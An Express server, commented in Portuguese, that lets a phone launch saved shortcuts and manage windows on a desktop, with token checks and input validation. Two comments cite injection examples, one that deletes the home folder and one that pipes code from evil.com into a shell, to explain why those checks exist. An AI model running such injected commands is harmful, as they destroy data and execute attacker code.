const fs = require('fs');
const os = require('os');
const path = require('path');
const express = require('express');
const { exec, spawn } = require('child_process');
const cors = require('cors');
const QRCode = require('qrcode');

// Valida o "id" de uma janela antes de colar ele dentro de um comando de
// shell (xdotool/osascript/powershell) — sem isso, um id malicioso vindo da
// URL poderia injetar comandos extras (ex: GET /fechar/0x1;rm -rf ~). O
// formato esperado depende do SO: no Linux é o id hexadecimal do wmctrl, no
// Windows é o PID (só números), no macOS é o nome do processo.
function idJanelaValido(id, plataforma) {
    if (plataforma === 'linux') return /^0x[0-9a-fA-F]+$/.test(id);
    if (plataforma === 'win32') return /^\d+$/.test(id);
    return /^[\p{L}\p{N} ._-]+$/u.test(id); // darwin: nome do processo
}

// Token de emparelhamento: gerado uma vez quando o servidor liga. Sem ele,
// qualquer um na mesma rede (ou até um site malicioso que o navegador abra,
// já que dá pra chamar localhost:3000 de qualquer página) conseguia criar
// atalhos e disparar comandos. Agora, quem não está na própria máquina
// precisa desse token — que só é revelado pra quem já está na própria
// máquina (via /conexao e /qr) ou já recebeu o link (celular, depois de
// escanear o QR uma vez).
const crypto = require('crypto');
const TOKEN = crypto.randomBytes(16).toString('hex');

// Requisições vindas da própria máquina (a janela do QuickDeck, ou o próprio
// navegador do dono usando localhost) são sempre confiáveis — não faz
// sentido pedir token pra quem já está sentado no computador.
function ehRequisicaoLocal(req) {
    const ip = req.ip || '';
    return ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1';
}

function tokenValido(req) {
    return req.get('X-QuickDeck-Token') === TOKEN;
}

// Exige que a requisição seja local OU traga o token correto — usado nas
// rotas que criam/editam atalhos ou disparam comandos/ações no sistema.
function exigirAutorizacao(req, res, next) {
    if (ehRequisicaoLocal(req) || tokenValido(req)) return next();
    res.status(401).json({ status: 'erro', error: 'Não autorizado. Conecte pelo QR code em "Conectar celular".' });
}

const app = express();
// CORS permite que a janela do app (que carrega os arquivos de um jeito
// diferente de http://localhost:3000) consiga ler as respostas da API.
app.set('trust proxy', false);
app.use(cors());
app.use(express.json());

// Permite servir os arquivos estáticos da mesma pasta (como o nosso HTML)
app.use(express.static(path.join(__dirname, 'public')));

// --- Server-Sent Events: avisa todo mundo conectado (celular, outras
// janelas) quando a lista de atalhos muda, pra atualizarem sozinhos sem
// precisar recarregar a página manualmente.
const clientesSSE = new Set();

app.get('/eventos', (req, res) => {
    res.set({
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        Connection: 'keep-alive',
    });
    res.flushHeaders();
    res.write(': conectado\n\n'); // comentário SSE, só pra abrir a conexão

    clientesSSE.add(res);
    req.on('close', () => clientesSSE.delete(res));
});

function notificarAtalhosAtualizados() {
    for (const res of clientesSSE) {
        res.write('event: atalhos-atualizados\ndata: {}\n\n');
    }
}

// Onde o atalhos.json de verdade fica salvo. No app instalado (empacotado
// com 'pkg'), a pasta do próprio executável pode não ter permissão de
// escrita (ex: Program Files no Windows) — por isso o Tauri passa uma pasta
// de dados do usuário via variável de ambiente. Rodando direto com
// 'node server.js' (desenvolvimento), cai de volta pra pasta do projeto.
const DIR_DADOS = process.env.QUICKDECK_DATA_DIR || __dirname;
const CAMINHO_ATALHOS = path.join(DIR_DADOS, 'atalhos.json');

// Lê a lista de atalhos direto de atalhos.json a cada chamada — assim editar
// esse arquivo (adicionar/remover um atalho) não exige reiniciar o servidor.
// Cada atalho tem um "id" semântico, nome/ícone pra exibir no celular, e o
// comando real por sistema operacional.
function carregarAtalhos() {
    if (!fs.existsSync(CAMINHO_ATALHOS)) {
        // Primeira vez rodando nessa pasta de dados: semeia com os atalhos
        // padrão (embutidos no próprio binário, então sempre existem).
        const padrao = fs.readFileSync(path.join(__dirname, 'atalhos.default.json'), 'utf-8');
        fs.mkdirSync(DIR_DADOS, { recursive: true });
        fs.writeFileSync(CAMINHO_ATALHOS, padrao);
    }
    const conteudo = fs.readFileSync(CAMINHO_ATALHOS, 'utf-8');
    return JSON.parse(conteudo);
}

function salvarAtalhos(atalhos) {
    fs.writeFileSync(CAMINHO_ATALHOS, JSON.stringify(atalhos, null, 2));
}

// Gera um id simples e único a partir do nome digitado (ex: "Meu App" -> "meu-app")
function gerarId(nome, atalhosExistentes) {
    const base = nome
        .toLowerCase()
        .normalize('NFD').replace(/[\u0300-\u036f]/g, '') // remove acentos
        .replace(/[^a-z0-9]+/g, '-')
        .replace(/(^-|-$)/g, '') || 'atalho';

    let id = base;
    let contador = 2;
    while (atalhosExistentes.some(a => a.id === id)) {
        id = `${base}-${contador}`;
        contador++;
    }
    return id;
}

// Descobre o IP da máquina na rede local (não o 127.0.0.1), pra saber qual
// endereço o celular deve digitar/escanear pra se conectar.
function pegarIPLocal() {
    const interfaces = os.networkInterfaces();
    for (const nome of Object.keys(interfaces)) {
        for (const info of interfaces[nome]) {
            if (info.family === 'IPv4' && !info.internal) {
                return info.address;
            }
        }
    }
    return 'localhost';
}

const PORTA = 3000;

// Rota que a própria janela consulta pra mostrar "conecte o celular em
// http://IP:PORTA" — texto e, opcionalmente, um QR code (rota /qr).
// Só a própria máquina pode pedir o link/QR de conexão — ele carrega o
// token de emparelhamento, então se qualquer um na rede pudesse chamar essa
// rota, teria como conseguir o token sem precisar olhar a tela do PC.
app.get('/conexao', (req, res) => {
    if (!ehRequisicaoLocal(req)) {
        return res.status(403).json({ status: 'erro', error: 'Só disponível na própria máquina.' });
    }
    const ip = pegarIPLocal();
    res.json({ status: 'sucesso', ip, porta: PORTA, url: `http://${ip}:${PORTA}/index.html?token=${TOKEN}` });
});

// Gera um QR code (PNG) que aponta pro endereço da janela na rede local,
// pra escanear com a câmera do celular em vez de digitar o IP na mão.
app.get('/qr', async (req, res) => {
    if (!ehRequisicaoLocal(req)) {
        return res.status(403).json({ status: 'erro', error: 'Só disponível na própria máquina.' });
    }
    const ip = pegarIPLocal();
    const url = `http://${ip}:${PORTA}/index.html?token=${TOKEN}`;
    try {
        const png = await QRCode.toBuffer(url, { width: 220, margin: 1 });
        res.set('Content-Type', 'image/png');
        res.send(png);
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Rota que o celular consulta pra montar os botões da aba "Atalhos"
// dinamicamente, em vez de ter os botões fixos no HTML.
app.get('/atalhos', (req, res) => {
    try {
        const atalhos = carregarAtalhos();
        res.json({
            status: 'sucesso',
            atalhos: atalhos.map(({ id, nome, icone }) => ({ id, nome, icone })),
        });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Cria um atalho novo, direto pela interface (janela do app). Como quem
// preenche o formulário está na própria máquina que vai executar o comando,
// pedimos só o comando da plataforma atual (process.platform) — não os três.
app.post('/atalhos', exigirAutorizacao, (req, res) => {
    const { nome, icone, comando } = req.body;

    if (!nome || !comando) {
        return res.status(400).json({ status: 'erro', error: 'Nome e comando são obrigatórios.' });
    }

    try {
        const atalhos = carregarAtalhos();
        const novoAtalho = {
            id: gerarId(nome, atalhos),
            nome,
            icone: icone || '🔗',
            comando: { [process.platform]: comando },
        };
        atalhos.push(novoAtalho);
        salvarAtalhos(atalhos);
        notificarAtalhosAtualizados();
        res.json({ status: 'sucesso', atalho: novoAtalho });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Devolve um atalho específico (usado pra pré-preencher o formulário de
// edição — inclui o comando da plataforma atual, que a lista geral de
// /atalhos não manda pro celular).
app.get('/atalhos/:id', (req, res) => {
    try {
        const atalhos = carregarAtalhos();
        const atalho = atalhos.find(a => a.id === req.params.id);
        if (!atalho) {
            return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
        }
        res.json({
            status: 'sucesso',
            atalho: {
                id: atalho.id,
                nome: atalho.nome,
                icone: atalho.icone,
                comando: atalho.comando[process.platform] || '',
            },
        });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Edita um atalho existente (nome, ícone e/ou comando da plataforma atual).
app.put('/atalhos/:id', exigirAutorizacao, (req, res) => {
    const { nome, icone, comando } = req.body;

    if (!nome || !comando) {
        return res.status(400).json({ status: 'erro', error: 'Nome e comando são obrigatórios.' });
    }

    try {
        const atalhos = carregarAtalhos();
        const atalho = atalhos.find(a => a.id === req.params.id);

        if (!atalho) {
            return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
        }

        atalho.nome = nome;
        atalho.icone = icone || atalho.icone;
        atalho.comando[process.platform] = comando;

        salvarAtalhos(atalhos);
        notificarAtalhosAtualizados();
        res.json({ status: 'sucesso', atalho });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Exclui um atalho pelo id.
app.delete('/atalhos/:id', exigirAutorizacao, (req, res) => {
    try {
        const atalhos = carregarAtalhos();
        const restantes = atalhos.filter(a => a.id !== req.params.id);

        if (restantes.length === atalhos.length) {
            return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
        }

        salvarAtalhos(restantes);
        notificarAtalhosAtualizados();
        res.json({ status: 'sucesso' });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Lista os programas instalados no computador, pra preencher o formulário de
// "Novo atalho" sem precisar digitar o comando de cor. Cada SO guarda essa
// informação de um jeito bem diferente.
function listarAppsInstaladosLinux() {
    // Aplicativos com atalho de menu ficam descritos em arquivos .desktop,
    // um por app, com campos "Name=" (nome de exibição) e "Exec=" (comando).
    const pastas = [
        '/usr/share/applications',
        '/usr/local/share/applications',
        path.join(os.homedir(), '.local/share/applications'),
    ];

    const apps = [];
    const vistos = new Set();

    for (const pasta of pastas) {
        let arquivos;
        try {
            arquivos = fs.readdirSync(pasta).filter(f => f.endsWith('.desktop'));
        } catch {
            continue; // pasta pode não existir
        }

        for (const arquivo of arquivos) {
            let conteudo;
            try {
                conteudo = fs.readFileSync(path.join(pasta, arquivo), 'utf-8');
            } catch {
                continue;
            }

            // Ignora entradas escondidas do menu (NoDisplay/Hidden) e as que
            // não são de aplicativo (ex: atalhos de configuração do sistema)
            if (/^(NoDisplay|Hidden)\s*=\s*true/mi.test(conteudo)) continue;

            const nomeMatch = conteudo.match(/^Name=(.+)$/m);
            const execMatch = conteudo.match(/^Exec=(.+)$/m);
            if (!nomeMatch || !execMatch) continue;

            const nome = nomeMatch[1].trim();
            // Remove placeholders que o .desktop usa pra receber
            // arquivos/URLs como argumento (%f, %F, %u, %U, %i, %c, %k)
            const comando = execMatch[1].replace(/%[a-zA-Z]/g, '').trim();

            if (!nome || !comando || vistos.has(nome)) continue;
            vistos.add(nome);
            apps.push({ nome, comando });
        }
    }

    return apps.sort((a, b) => a.nome.localeCompare(b.nome));
}

function listarAppsInstaladosWindows(callback) {
    // Get-StartApps lista tudo que aparece no Menu Iniciar (atalhos .lnk
    // clássicos e também apps modernos/UWP), com Name + AppID.
    const script = 'powershell -NoProfile -Command "Get-StartApps | ConvertTo-Json -Compress"';
    exec(script, { maxBuffer: 10 * 1024 * 1024 }, (error, stdout) => {
        if (error) return callback(error);
        try {
            let lista = JSON.parse(stdout);
            if (!Array.isArray(lista)) lista = [lista];
            const apps = lista
                .filter(item => item && item.Name && item.AppID)
                .map(item => ({
                    nome: item.Name,
                    // shell:AppsFolder\<AppID> abre tanto apps clássicos
                    // quanto UWP/Store de forma uniforme no Windows.
                    comando: `explorer.exe shell:AppsFolder\\${item.AppID}`,
                }))
                .sort((a, b) => a.nome.localeCompare(b.nome));
            callback(null, apps);
        } catch (parseError) {
            callback(parseError);
        }
    });
}

function listarAppsInstaladosMac() {
    const pastas = ['/Applications', path.join(os.homedir(), 'Applications')];
    const apps = [];

    for (const pasta of pastas) {
        let entradas;
        try {
            entradas = fs.readdirSync(pasta).filter(f => f.endsWith('.app'));
        } catch {
            continue;
        }
        for (const entrada of entradas) {
            const nome = entrada.replace(/\.app$/, '');
            apps.push({ nome, comando: `open -a "${nome}"` });
        }
    }

    return apps.sort((a, b) => a.nome.localeCompare(b.nome));
}

app.get('/apps-instalados', (req, res) => {
    const plataforma = process.platform;

    if (plataforma === 'linux') {
        return res.json({ status: 'sucesso', apps: listarAppsInstaladosLinux() });
    }

    if (plataforma === 'darwin') {
        return res.json({ status: 'sucesso', apps: listarAppsInstaladosMac() });
    }

    if (plataforma === 'win32') {
        return listarAppsInstaladosWindows((error, apps) => {
            if (error) return res.status(500).json({ status: 'erro', error: error.message });
            res.json({ status: 'sucesso', apps });
        });
    }

    res.status(500).json({ status: 'erro', error: 'Plataforma não suportada.' });
});

// Se o comando de um atalho for um link (ex: "https://..."), troca pelo
// comando que abre esse link no navegador padrão do sistema — assim o
// usuário só cola a URL, sem precisar saber o comando certo de cada SO.
function comandoParaExecutar(comando, plataforma) {
    if (!/^https?:\/\//i.test(comando.trim())) return comando;

    const url = comando.trim();
    if (plataforma === 'darwin') return `open "${url}"`;
    if (plataforma === 'win32') return `start "" "${url}"`;
    return `xdg-open "${url}"`;
}

// Rota dinâmica: recebe o id de um atalho salvo (ex: "navegador", "editor")
// e dispara o comando mapeado pra esse atalho no sistema operacional atual.
app.get('/launch/:appName', exigirAutorizacao, (req, res) => {
    const appName = req.params.appName;
    const plataforma = process.platform; // 'win32' | 'darwin' | 'linux'

    // Só executa comandos de atalhos que já existem em atalhos.json — nunca
    // texto cru vindo da URL, que permitiria injetar qualquer comando no
    // sistema (ex: GET /launch/calc;curl%20evil.com|sh).
    const atalhos = carregarAtalhos();
    const atalho = atalhos.find(a => a.id === appName);

    if (!atalho || !atalho.comando[plataforma]) {
        return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
    }

    const comando = comandoParaExecutar(atalho.comando[plataforma], plataforma);

    // Usamos 'spawn' (não 'exec') porque 'exec' só chama o callback quando o
    // processo TERMINA. Para apps de interface gráfica que ficam abertos
    // (editor, navegador), isso deixava a requisição do celular pendurada
    // até a janela ser fechada. Com 'spawn' + 'detached: true' + 'unref()',
    // o processo é desacoplado do servidor e respondemos assim que ele é
    // disparado, sem esperar ele terminar.
    const child = spawn(comando, { shell: true, detached: true, stdio: 'ignore' });

    child.on('error', (error) => {
        console.error(`Erro ao executar o comando: ${error.message}`);
    });

    child.unref();

    res.json({ status: 'sucesso', opened: appName, comando });
});

// Rota para listar aplicativos abertos (Dock dinâmico), adaptada por
// plataforma: AppleScript no macOS, wmctrl no Linux, PowerShell no Windows.
// Cada item tem um "id" (usado depois pra fechar/minimizar essa janela
// específica) e um "titulo" (o que aparece pro usuário).
app.get('/apps-abertos', (req, res) => {
    const plataforma = process.platform;

    if (plataforma === 'darwin') {
        const script = `osascript -e 'tell application "System Events" to get name of every process whose background only is false'`;
        exec(script, (error, stdout) => {
            if (error) {
                return res.status(500).json({ status: 'erro', error: error.message });
            }
            // O AppleScript retorna uma lista separada por vírgulas (ex: "Safari, Google Chrome, Finder")
            // No macOS o "id" é o próprio nome do processo — é o que o
            // AppleScript usa pra falar com o app (quit/hide).
            const apps = stdout.trim().split(', ').map(a => a.replace(/"/g, ''))
                .map(nome => ({ id: nome, titulo: nome }));
            res.json({ status: 'sucesso', apps });
        });
        return;
    }

    if (plataforma === 'win32') {
        // Lista PID + nome dos processos com janela visível. O PID vira o
        // "id" usado depois pra fechar/minimizar essa janela específica.
        const script = "powershell -NoProfile -Command \"Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object Id, ProcessName | ConvertTo-Json -Compress\"";
        exec(script, (error, stdout) => {
            if (error) {
                return res.status(500).json({ status: 'erro', error: error.message });
            }
            try {
                let lista = JSON.parse(stdout);
                if (!Array.isArray(lista)) lista = [lista];
                const apps = lista.map(item => ({ id: String(item.Id), titulo: item.ProcessName }));
                res.json({ status: 'sucesso', apps });
            } catch (parseError) {
                res.status(500).json({ status: 'erro', error: parseError.message });
            }
        });
        return;
    }

    // Linux: usa wmctrl -l pra listar as janelas abertas. Requer o pacote
    // 'wmctrl' instalado (ex: 'sudo apt install wmctrl').
    exec('wmctrl -l', (error, stdout) => {
        if (error) {
            return res.status(500).json({
                status: 'erro',
                error: `${error.message} (dica: instale o wmctrl, ex: 'sudo apt install wmctrl')`,
            });
        }
        // Cada linha do wmctrl -l é: "<id janela>  <desktop>  <host>  <título>"
        // O id (1ª coluna, ex: "0x0520001e") é o que usamos depois pra
        // fechar/minimizar essa janela específica — é mais confiável que o
        // título, que pode mudar (ex: título do terminal muda com o diretório).
        const apps = stdout
            .trim()
            .split('\n')
            .filter(Boolean)
            .map(linha => {
                const colunas = linha.trim().split(/\s+/);
                return { id: colunas[0], titulo: colunas.slice(3).join(' ') };
            })
            .filter(app => app.titulo);
        res.json({ status: 'sucesso', apps });
    });
});

// Fecha uma janela específica, identificada pelo "id" retornado em
// /apps-abertos (não pelo título — evita fechar a janela errada).
app.get('/fechar/:id', exigirAutorizacao, (req, res) => {
    const { id } = req.params;
    const plataforma = process.platform;

    if (!idJanelaValido(id, plataforma)) {
        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
    }

    let script;
    if (plataforma === 'darwin') {
        script = `osascript -e 'tell application "${id}" to quit'`;
    } else if (plataforma === 'win32') {
        script = `powershell -NoProfile -Command "(Get-Process -Id ${id}).CloseMainWindow()"`;
    } else {
        // Linux: requer o pacote 'xdotool' instalado (ex: 'sudo apt install xdotool').
        script = `xdotool windowclose ${id}`;
    }

    exec(script, (error) => {
        if (error) {
            return res.status(500).json({
                status: 'erro',
                error: plataforma === 'linux'
                    ? `${error.message} (dica: instale o xdotool, ex: 'sudo apt install xdotool')`
                    : error.message,
            });
        }
        res.json({ status: 'sucesso' });
    });
});

// Minimiza uma janela específica, identificada pelo "id" de /apps-abertos.
app.get('/minimizar/:id', exigirAutorizacao, (req, res) => {
    const { id } = req.params;
    const plataforma = process.platform;

    if (!idJanelaValido(id, plataforma)) {
        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
    }

    let script;
    if (plataforma === 'darwin') {
        // O AppleScript não tem "minimizar" direto pra qualquer app; "hide"
        // (esconder) é o equivalente prático mais confiável.
        script = `osascript -e 'tell application "System Events" to set visible of process "${id}" to false'`;
    } else if (plataforma === 'win32') {
        script = `powershell -NoProfile -Command "$sig='[DllImport(\\"user32.dll\\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; Add-Type -MemberDefinition $sig -Name Win32ShowWindowAsync -Namespace Win32Functions; $p = Get-Process -Id ${id}; [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($p.MainWindowHandle, 2)"`;
    } else {
        // Linux: requer o pacote 'xdotool' instalado. Testado: funciona de
        // verdade (o wmctrl sozinho, via '-b add,hidden', não minimizava
        // no Pop!_OS/GNOME — o xdotool sim).
        script = `xdotool windowminimize ${id}`;
    }

    exec(script, (error) => {
        if (error) {
            return res.status(500).json({
                status: 'erro',
                error: plataforma === 'linux'
                    ? `${error.message} (dica: instale o xdotool, ex: 'sudo apt install xdotool')`
                    : error.message,
            });
        }
        res.json({ status: 'sucesso' });
    });
});

// Restaura/foca uma janela específica, identificada pelo "id" retornado em
// /apps-abertos — usado quando o usuário clica no título de um app na aba
// Recentes/Dock, pra trazê-lo de volta (mesmo minimizado) em vez de abrir
// outra instância.
app.get('/ativar/:id', exigirAutorizacao, (req, res) => {
    const { id } = req.params;
    const plataforma = process.platform;

    if (!idJanelaValido(id, plataforma)) {
        return res.status(400).json({ status: 'erro', error: 'Id de janela inválido.' });
    }

    let script;
    if (plataforma === 'darwin') {
        script = `osascript -e 'tell application "${id}" to activate'`;
    } else if (plataforma === 'win32') {
        script = `powershell -NoProfile -Command "$sig='[DllImport(\\"user32.dll\\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); [DllImport(\\"user32.dll\\")] public static extern bool SetForegroundWindow(IntPtr hWnd);'; Add-Type -MemberDefinition $sig -Name Win32ShowWindowAsync -Namespace Win32Functions; $p = Get-Process -Id ${id}; [Win32Functions.Win32ShowWindowAsync]::ShowWindowAsync($p.MainWindowHandle, 9); [Win32Functions.Win32ShowWindowAsync]::SetForegroundWindow($p.MainWindowHandle)"`;
    } else {
        // Linux: xdotool windowactivate restaura (se minimizada) e foca a janela.
        script = `xdotool windowactivate ${id}`;
    }

    exec(script, (error) => {
        if (error) {
            return res.status(500).json({
                status: 'erro',
                error: plataforma === 'linux'
                    ? `${error.message} (dica: instale o xdotool, ex: 'sudo apt install xdotool')`
                    : error.message,
            });
        }
        res.json({ status: 'sucesso' });
    });
});

// Extrai o nome "base" de um comando (ex: '/usr/bin/gedit %U' -> 'gedit'),
// ignorando caminho, aspas e argumentos — usado pra casar um atalho com uma
// janela aberta de verdade.
function extrairComandoBase(comando) {
    const primeiroToken = comando.trim().split(/\s+/)[0].replace(/^["']|["']$/g, '');
    return path.basename(primeiroToken).toLowerCase();
}

const execPromise = require('util').promisify(exec);

// Acha a janela aberta (se houver) cujo processo corresponde ao comando de
// um atalho, e alterna entre minimizada/restaurada — usado quando o usuário
// dá duplo clique num atalho (um clique = abrir; dois cliques = minimizar
// ou trazer de volta o que já está aberto).
app.get('/toggle-minimizar-atalho/:atalhoId', exigirAutorizacao, async (req, res) => {
    const atalhos = carregarAtalhos();
    const atalho = atalhos.find(a => a.id === req.params.atalhoId);
    const plataforma = process.platform;

    if (!atalho || !atalho.comando[plataforma]) {
        return res.status(404).json({ status: 'erro', error: 'Atalho não encontrado.' });
    }

    const comandoBase = extrairComandoBase(atalho.comando[plataforma]);

    try {
        if (plataforma === 'linux') {
            const { stdout } = await execPromise('wmctrl -lp');
            const janelas = stdout.trim().split('\n').filter(Boolean).map(linha => {
                const colunas = linha.trim().split(/\s+/);
                return { id: colunas[0], pid: colunas[2] };
            });

            let janelaEncontrada = null;
            for (const janela of janelas) {
                try {
                    const cmdline = fs.readFileSync(`/proc/${janela.pid}/cmdline`, 'utf-8');
                    const argv0 = path.basename(cmdline.split('\0')[0] || '').toLowerCase();
                    if (argv0 === comandoBase) {
                        janelaEncontrada = janela;
                        break;
                    }
                } catch {
                    // processo pode ter fechado entre o wmctrl e a leitura — ignora
                }
            }

            if (!janelaEncontrada) {
                return res.json({ status: 'sucesso', acao: 'nao_encontrado' });
            }

            const { stdout: estado } = await execPromise(`xprop -id ${janelaEncontrada.id} _NET_WM_STATE`);
            const minimizada = estado.includes('_NET_WM_STATE_HIDDEN');

            if (minimizada) {
                await execPromise(`xdotool windowactivate ${janelaEncontrada.id}`);
                return res.json({ status: 'sucesso', acao: 'restaurado' });
            } else {
                await execPromise(`xdotool windowminimize ${janelaEncontrada.id}`);
                return res.json({ status: 'sucesso', acao: 'minimizado' });
            }
        }

        if (plataforma === 'win32') {
            // Acha o processo pelo nome (sem .exe) e alterna minimizar/restaurar
            // via ShowWindowAsync (SW_MINIMIZE=6, SW_RESTORE=9), checando o
            // estado atual com IsIconic.
            const script = `powershell -NoProfile -Command "` +
                `$sig='[DllImport(\\"user32.dll\\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); [DllImport(\\"user32.dll\\")] public static extern bool IsIconic(IntPtr hWnd);'; ` +
                `Add-Type -MemberDefinition $sig -Name Win32 -Namespace W; ` +
                `$p = Get-Process -Name '${comandoBase}' -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object -First 1; ` +
                `if ($null -eq $p) { Write-Output 'nao_encontrado' } ` +
                `elseif ([W.Win32]::IsIconic($p.MainWindowHandle)) { [W.Win32]::ShowWindowAsync($p.MainWindowHandle, 9); Write-Output 'restaurado' } ` +
                `else { [W.Win32]::ShowWindowAsync($p.MainWindowHandle, 6); Write-Output 'minimizado' }"`;
            const { stdout } = await execPromise(script);
            return res.json({ status: 'sucesso', acao: stdout.trim() });
        }

        if (plataforma === 'darwin') {
            // No macOS o "id" de app é o nome do processo — alterna a
            // visibilidade (visible) dele via System Events.
            const script = `osascript -e '
                tell application "System Events"
                    if exists process "${comandoBase}" then
                        set estaVisivel to visible of process "${comandoBase}"
                        set visible of process "${comandoBase}" to not estaVisivel
                        if estaVisivel then
                            return "minimizado"
                        else
                            return "restaurado"
                        end if
                    else
                        return "nao_encontrado"
                    end if
                end tell'`;
            const { stdout } = await execPromise(script);
            return res.json({ status: 'sucesso', acao: stdout.trim() });
        }

        res.status(500).json({ status: 'erro', error: 'Plataforma não suportada.' });
    } catch (error) {
        res.status(500).json({ status: 'erro', error: error.message });
    }
});

// Inicia o servidor na porta 3000 escutando em toda a rede local ('0.0.0.0')
app.listen(PORTA, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORTA} e pronto para conexões locais!`);
});
